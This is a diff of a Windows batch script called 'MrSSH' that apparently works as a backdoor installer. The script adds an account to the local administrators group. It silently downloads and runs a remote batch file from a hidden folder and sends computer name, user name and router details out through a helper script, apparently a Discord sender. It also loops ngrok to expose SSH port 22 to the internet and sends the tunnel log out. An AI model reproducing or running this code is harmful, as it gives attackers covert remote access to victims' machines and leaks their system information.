@@ -14,18 +14,15 @@ net localgroup Administración Admin /add
 
 set ""
 
-call source.bat +silent --embed "MrSSH install code has been invoked on some computer" "Files with information will be send soon" "50c878"
+call source.bat +silent --embed "MrSSH install code has been invoked on %computername%\%username%" "Files with information will be send soon" "50c878"
 
 :: router info command
 curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router --Usecolors False>router.txt & call Source.bat +silent --file %temp%/router.txt
-
-whoami>user.txt
-call Source.bat +silent --file %temp%/user.txt
 
 tar -xf ngrok.zip
 
 :ngrokloop
 start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
 goto ngrokloop
 
